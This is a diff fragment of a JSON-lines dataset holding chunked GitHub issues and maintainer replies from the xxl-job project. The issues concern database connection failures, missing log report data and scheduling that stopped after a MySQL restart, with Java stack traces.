+    "updated_at": "2025-12-21T12:10:03Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3886_3680054864_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3886,
+  "chunk_index": 0,
+  "title": "docker 部署xxl-job 2.3.0 和 2.3.1连接docker-mysql数据库失败",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3886#issuecomment-3680054864",
+  "text": "执行器 还没部署赛，目前只部署了调度中心，调度中心页面能打开 但是数据库连不上，我用navicat 可以正常连接，用户权限也是所有权限 ，宿主机 telnet mysqlIP 3306 也是正常的",
+  "metadata": {
+    "author": "liuyajian1",
+    "created_at": "2025-12-22T02:13:28Z",
+    "updated_at": "2025-12-22T02:13:28Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3886_3694610553_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3886,
+  "chunk_index": 0,
+  "title": "docker 部署xxl-job 2.3.0 和 2.3.1连接docker-mysql数据库失败",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3886#issuecomment-3694610553",
+  "text": "需要确保 “调度中心 - 数据库” 之间网络通畅。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2025-12-28T09:44:27Z",
+    "updated_at": "2025-12-28T09:44:27Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_3885_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue",
+  "source_id": 3885,
+  "chunk_index": 0,
+  "title": "版本2.5.0 突然发现最近几天的 XxlJobLogReport 数据不生成了，重复xxl-job-admin后最近三天的XxlJobLogReport又重新生成",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3885",
+  "text": "版本：xuxueli/xxl-job-admin:2.5.0\n环境：redhat7.8\n最近登录后发现首页的 调度报表 折线图没有数据了，发现从12-02 开始 表 xxl_job_log_report 就不再生成数据了，找了一圈没发现问题，就重启了一下xxl-job-admin模块，然后发现最近3天的 xxl_job_log_report 又重新生成了，目前查看最近一个月调度报表数据如下：\n\n<img width=\"1510\" height=\"565\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/fe1c6044-c228-4018-898c-74064c46e7fb\" />\n\n之前调度报表生成这里一直没问题，就是最近突然发现从12月2号开始，不再生成 数据了。\n本地测试在 JobLogReportHelper  中对应打印日志发现是能正常的，每分钟统计同步一次数据到 xxl_job_log_report 中，麻烦看一下是怎么回事",
+  "metadata": {
+    "state": "closed",
+    "created_at": "2025-12-19T07:55:46Z",
+    "updated_at": "2025-12-28T09:46:56Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3885_3694612045_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3885,
+  "chunk_index": 0,
+  "title": "版本2.5.0 突然发现最近几天的 XxlJobLogReport 数据不生成了，重复xxl-job-admin后最近三天的XxlJobLogReport又重新生成",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3885#issuecomment-3694612045",
+  "text": "低版本异常情况下存在守护线程中断问题，建议升级。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2025-12-28T09:46:56Z",
+    "updated_at": "2025-12-28T09:46:56Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_3884_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue",
+  "source_id": 3884,
+  "chunk_index": 0,
+  "title": "数据库重启。导致定时任务调度中断",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3884",
+  "text": "版本：xuxueli/xxl-job-admin:3.3.1\n环境：centos7.9 + docker 26.1.4\n\n下午16点的时候，数据库关机了。导致调度中断了，数据库恢复了，调度也没有恢复。但是手动调用就可以了。\n\n今天早上重启了xxljob，调度恢复\n\n2025-12-18 16:20:53.686 [xxl-job, admin JobRegistryMonitorHelper-registryMonitorThread] WARN  com.zaxxer.hikari.pool.PoolBase - HikariCP - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@5820295e (Server shutdown in progress). Possibly consider using a shorter maxLifetime value.\n2025-12-18 16:20:53.689 [xxl-job, admin JobRegistryMonitorHelper-registryMonitorThread] WARN  com.zaxxer.hikari.pool.PoolBase - HikariCP - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@53822580 (Server shutdown in progress). Possibly consider using a shorter maxLifetime value.\n2025-12-18 16:20:53.690 [xxl-job, admin JobRegistryMonitorHelper-registryMonitorThread] WARN  com.zaxxer.hikari.pool.PoolBase - HikariCP - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@3617a9ab (Server shutdown in progress). Possibly consider using a shorter m",
+  "metadata": {
+    "state": "closed",
+    "created_at": "2025-12-19T02:07:01Z",
+    "updated_at": "2025-12-28T09:48:10Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_3884_chunk_1",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue",
+  "source_id": 3884,
+  "chunk_index": 1,
+  "title": "数据库重启。导致定时任务调度中断",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3884",
+  "text": "l.cj.jdbc.ConnectionImpl@3617a9ab (Server shutdown in progress). Possibly consider using a shorter maxLifetime value.\n2025-12-18 16:20:53.690 [xxl-job, admin JobRegistryMonitorHelper-registryMonitorThread] WARN  com.zaxxer.hikari.pool.PoolBase - HikariCP - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@6fa41cee (Server shutdown in progress). Possibly consider using a shorter maxLifetime value.\n2025-12-18 16:20:53.691 [xxl-job, admin JobRegistryMonitorHelper-registryMonitorThread] WARN  com.zaxxer.hikari.pool.PoolBase - HikariCP - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@25f48999 (Server shutdown in progress). Possibly consider using a shorter maxLifetime value.\n2025-12-18 16:20:53.692 [xxl-job, admin JobRegistryMonitorHelper-registryMonitorThread] WARN  com.zaxxer.hikari.pool.PoolBase - HikariCP - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@67181682 (Server shutdown in progress). Possibly consider using a shorter maxLifetime valu",
+  "metadata": {
+    "state": "closed",
+    "created_at": "2025-12-19T02:07:01Z",
+    "updated_at": "2025-12-28T09:48:10Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_3884_chunk_2",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue",
+  "source_id": 3884,
+  "chunk_index": 2,
+  "title": "数据库重启。导致定时任务调度中断",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3884",
+  "text": "ctionImpl@67181682 (Server shutdown in progress). Possibly consider using a shorter maxLifetime value.\n2025-12-18 16:20:53.692 [xxl-job, admin JobRegistryMonitorHelper-registryMonitorThread] WARN  com.zaxxer.hikari.pool.PoolBase - HikariCP - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@6cc9a13b (Server shutdown in progress). Possibly consider using a shorter maxLifetime value.\n2025-12-18 16:20:53.693 [xxl-job, admin JobRegistryMonitorHelper-registryMonitorThread] WARN  com.zaxxer.hikari.pool.PoolBase - HikariCP - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@23458320 (Server shutdown in progress). Possibly consider using a shorter maxLifetime value.\n2025-12-18 16:20:53.694 [xxl-job, admin JobRegistryMonitorHelper-registryMonitorThread] WARN  com.zaxxer.hikari.pool.PoolBase - HikariCP - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@22fc6e90 (Server shutdown in progress). Possibly consider using a shorter maxLifetime value.\n2025-12-18 1",
+  "metadata": {
+    "state": "closed",
+    "created_at": "2025-12-19T02:07:01Z",
+    "updated_at": "2025-12-28T09:48:10Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_3884_chunk_3",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue",
+  "source_id": 3884,
+  "chunk_index": 3,
+  "title": "数据库重启。导致定时任务调度中断",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3884",
+  "text": "e90 (Server shutdown in progress). Possibly consider using a shorter maxLifetime value.\n2025-12-18 16:20:53.695 [xxl-job, admin JobRegistryMonitorHelper-registryMonitorThread] WARN  com.zaxxer.hikari.pool.PoolBase - HikariCP - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@577d04b (Server shutdown in progress). Possibly consider using a shorter maxLifetime value.\n2025-12-18 16:21:03.165 [xxl-job, admin JobRegistryMonitorHelper-registryMonitorThread] ERROR c.x.j.a.s.thread.JobRegistryHelper - >>>>>>>>>>> xxl-job, job registry monitor thread error:{}\norg.mybatis.spring.MyBatisSystemException: \n### Error querying database.  Cause: org.springframework.jdbc.CannotGetJdbcConnectionException: Failed to obtain JDBC Connection\n### The error may exist in class path resource [mapper/XxlJobGroupMapper.xml]\n### The error may involve com.xxl.job.admin.mapper.XxlJobGroupMapper.findByAddressType\n### The error occurred while executing a query\n### Cause: org.springframework.jdbc.CannotGe",
+  "metadata": {
+    "state": "closed",
+    "created_at": "2025-12-19T02:07:01Z",
+    "updated_at": "2025-12-28T09:48:10Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_3884_chunk_4",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue",
+  "source_id": 3884,
+  "chunk_index": 4,
+  "title": "数据库重启。导致定时任务调度中断",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3884",
+  "text": "ressType\n### The error occurred while executing a query\n### Cause: org.springframework.jdbc.CannotGetJdbcConnectionException: Failed to obtain JDBC Connection\n\tat org.mybatis.spring.MyBatisExceptionTranslator.translateExceptionIfPossible(MyBatisExceptionTranslator.java:101)\n\tat org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:362)\n\tat jdk.proxy2/jdk.proxy2.$Proxy80.selectList(Unknown Source)\n\tat org.mybatis.spring.SqlSessionTemplate.selectList(SqlSessionTemplate.java:209)\n\tat org.apache.ibatis.binding.MapperMethod.executeForMany(MapperMethod.java:147)\n\tat org.apache.ibatis.binding.MapperMethod.execute(MapperMethod.java:80)\n\tat org.apache.ibatis.binding.MapperProxy$PlainMethodInvoker.invoke(MapperProxy.java:141)\n\tat org.apache.ibatis.binding.MapperProxy.invoke(MapperProxy.java:86)\n\tat jdk.proxy2/jdk.proxy2.$Proxy81.findByAddressType(Unknown Source)\n\tat com.xxl.job.admin.scheduler.thread.JobRegistryHelper$3.run(JobRegistryHelper.java:64)\n\tat java",
+  "metadata": {
+    "state": "closed",
+    "created_at": "2025-12-19T02:07:01Z",
+    "updated_at": "2025-12-28T09:48:10Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_3884_chunk_5",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue",
+  "source_id": 3884,
+  "chunk_index": 5,
+  "title": "数据库重启。导致定时任务调度中断",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3884",
+  "text": ")\n\tat com.xxl.job.admin.scheduler.thread.JobRegistryHelper$3.run(JobRegistryHelper.java:64)\n\tat java.base/java.lang.Thread.run(Thread.java:1583)\n\n[xxl-job-admin.log.2025-12-18.log](https://github.com/user-attachments/files/24249059/xxl-job-admin.log.2025-12-18.log)",
+  "metadata": {
+    "state": "closed",
+    "created_at": "2025-12-19T02:07:01Z",
+    "updated_at": "2025-12-28T09:48:10Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3884_3694612764_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3884,
+  "chunk_index": 0,
+  "title": "数据库重启。导致定时任务调度中断",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3884#issuecomment-3694612764",
+  "text": "针对异常情况下调度线程中断问题，已单独推送强化代码，近期将会跟随下个版本发布，可关注。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2025-12-28T09:48:10Z",
+    "updated_at": "2025-12-28T09:48:10Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_3883_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue",
+  "source_id": 3883,
+  "chunk_index": 0,
+  "title": "整体CS架构较为臃肿，建议同步一个xxl-job-admin的依赖库模式",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3883",
+  "text": "1. 如果本地开发内网不打通，配置服务器上的xxl-job，本地使用很不方便。本身是springboot项目，也有一些数据库脚本需要初始化，可以直接做个依赖，比较方便。\n2. 加了依赖之后可以走一个注册中心，执行器在注册中心那边拿地址，内部调用感觉更优雅些。\n\n话说，现在怎么这么流行cs架构。比如nacos需要单独安装，然后弄数据库，以前eureka明明可以直接在项目里面直接启动……",
+  "metadata": {
+    "state": "closed",
+    "created_at": "2025-12-16T19:23:38Z",
+    "updated_at": "2025-12-17T14:17:45Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3883_3665567220_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3883,
+  "chunk_index": 0,
+  "title": "整体CS架构较为臃肿，建议同步一个xxl-job-admin的依赖库模式",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3883#issuecomment-3665567220",
+  "text": "当前设计重要基于中心化管控时间考虑，如果有定制诉求可以灵活定制。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2025-12-17T14:17:35Z",
+    "updated_at": "2025-12-17T14:17:35Z"
   }
 }
